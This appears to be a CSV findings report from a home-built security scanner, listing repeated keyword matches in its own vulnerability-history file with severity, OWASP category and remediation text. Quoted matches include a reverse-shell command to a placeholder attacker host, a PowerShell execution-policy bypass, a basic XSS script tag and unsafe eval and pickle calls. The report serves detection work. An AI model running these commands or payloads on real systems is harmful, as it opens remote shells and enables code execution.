Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4694,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4702,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4731,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4739,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4747,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4755,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4763,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4771,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4779,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4787,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4795,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4803,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4832,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4840,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4848,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4856,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4864,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4872,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4880,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4888,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4896,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4904,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4933,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4941,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4949,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4957,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4965,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4973,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4981,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4989,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4997,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5005,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,553,"""finding"": ""sql_injection_payload"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,556,"""owasp"": ""A03: Injection"","
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,880,"""finding"": ""admin"","
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,903,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,911,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,919,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,927,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,935,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,943,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,951,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,959,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,967,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,975,"""content"": ""User logged in as admin"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,983,"""content"": ""User logged in as admin"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,989,"""finding"": ""xss"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,992,"""owasp"": ""A03: Injection"","
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1012,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1020,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1028,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1036,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1044,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1052,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1060,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1068,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1076,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1084,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1092,"""content"": ""XSS payload detected: <script>alert(1)</script>"""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1207,"""finding"": ""sql_injection_payload"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1210,"""owasp"": ""A03: Injection"","
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,1752,"""finding"": ""admin_endpoint"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2082,"""owasp"": ""A03: Injection"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2409,"""owasp"": ""A03: Injection"","
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2733,"""finding"": ""xss"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2736,"""owasp"": ""A03: Injection"","
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2756,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2764,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2772,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2780,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2788,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2796,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2804,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2812,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2820,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2828,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2836,"""content"": ""ERROR XSS payload: <script>alert(1)</script>"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2974,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2982,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2990,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,2998,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3006,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3014,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3022,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3030,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3038,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3046,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3054,"""content"": ""WARN Debug endpoint exposed: /debug/config"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3060,"""finding"": ""admin"","
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3083,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3091,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3099,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3107,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3115,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3123,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3131,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3139,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3147,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3155,"""content"": ""WARN User attempt access to admin_panel"""
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3163,"""content"": ""WARN User attempt access to admin_panel"""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3799,"""finding"": ""sql_injection_payload"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,3802,"""owasp"": ""A03: Injection"","
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4304,"""finding"": ""admin_endpoint"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4610,"""owasp"": ""A03: Injection"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,4812,"""owasp"": ""A03: Injection"","
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5011,"""finding"": ""sql"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5014,"""owasp"": ""A03: Injection"","
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5034,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5042,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5050,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5058,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5066,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5074,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5082,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5090,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5098,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
sql,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5106,"""content"": ""\""finding\"": \""sql_injection_payload\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5112,"""finding"": ""injection"","
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5135,"""content"": ""\""owasp\"": \""A03: Injection\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5143,"""content"": ""\""owasp\"": \""A03: Injection\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5151,"""content"": ""\""owasp\"": \""A03: Injection\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5159,"""content"": ""\""owasp\"": \""A03: Injection\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5167,"""content"": ""\""owasp\"": \""A03: Injection\"","""
injection,MEDIUM,MEDIUM,UNKNOWN,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5175,"""content"": ""\""owasp\"": \""A03: Injection\"","""
